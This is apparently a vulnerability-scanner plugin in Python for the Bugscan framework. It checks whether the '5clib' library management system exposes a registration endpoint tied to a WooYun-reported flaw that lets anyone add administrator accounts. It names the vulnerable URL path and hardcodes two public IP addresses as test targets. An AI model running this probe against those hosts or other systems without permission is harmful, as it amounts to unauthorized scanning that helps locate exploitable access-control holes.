#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 奶权
#_PlugName_ = 五车图书管系统越权添加管理员
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0128686
import re
def assign(service, arg):
    if service == '5clib':
        return True, arg
def audit(arg):
    payload = '5clib/Inuseraction.action?actionkind=reg'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 200 and "isIdCards()" in res and 'addressprompt' in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('5clib', 'http://58.119.33.50:8081/')[1])
    audit(assign('5clib', 'http://222.208.6.176:8081/')[1])